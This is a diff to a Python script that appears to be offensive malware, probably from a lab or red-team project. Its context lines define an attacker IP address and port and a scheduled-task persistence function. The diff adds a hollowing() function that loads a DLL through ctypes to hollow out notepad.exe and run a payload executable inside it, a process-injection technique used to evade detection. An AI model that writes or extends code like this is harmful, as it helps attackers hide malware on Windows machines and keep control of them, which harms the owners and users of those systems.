@@ -6,6 +6,8 @@ import sys
 import time
 import random
 import getpass
+from ctypes import cdll, c_char_p, c_int
+
 
 ATTACKER_IP = "192.168.56.102"
 ATTACKER_PORT = 9999
@@ -85,6 +87,20 @@ def shedule_task_for_user():
             print(result.stderr)
     except Exception as e:
         print(f"[-] Exception : {e}")
+
+def hollowing():
+    dll = cdll.LoadLibrary("hollowing.dll")
+    dll.Hollowing.argtypes = [c_char_p, c_char_p]
+    dll.Hollowing.restype = c_int
+
+    target = b"C:\\Windows\\System32\\notepad.exe"
+    payload = b"C:\\chemin\\vers\\payload.exe"
+
+    ret = dll.Hollowing(target, payload)
+    if ret == 0:
+        print("Hollowing réussi")
+    else:
+        print(f"Hollowing échoué, code erreur {ret}")
 
 
 
